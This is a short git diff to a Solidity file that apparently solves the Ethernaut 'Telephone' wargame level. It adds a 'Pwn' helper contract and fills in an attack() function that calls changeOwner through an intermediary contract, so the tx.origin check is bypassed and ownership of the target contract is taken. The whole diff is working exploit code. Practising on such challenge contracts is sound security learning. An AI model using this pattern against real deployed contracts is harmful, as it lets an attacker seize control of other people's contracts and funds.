@@ -6,6 +6,12 @@ interface ITelephone {
     function changeOwner(address _owner) external;
 }
 
+contract Pwn {
+    function pwn(ITelephone telephone, address owner) public {
+        telephone.changeOwner(owner);
+    }
+}
+
 contract TelephoneHack {
     ITelephone public challenge;
 
@@ -13,5 +19,7 @@ contract TelephoneHack {
         challenge = ITelephone(challengeAddress);
     }
 
-    function attack() external payable {}
+    function attack() external payable {
+        (new Pwn()).pwn(challenge, msg.sender);
+    }
 }
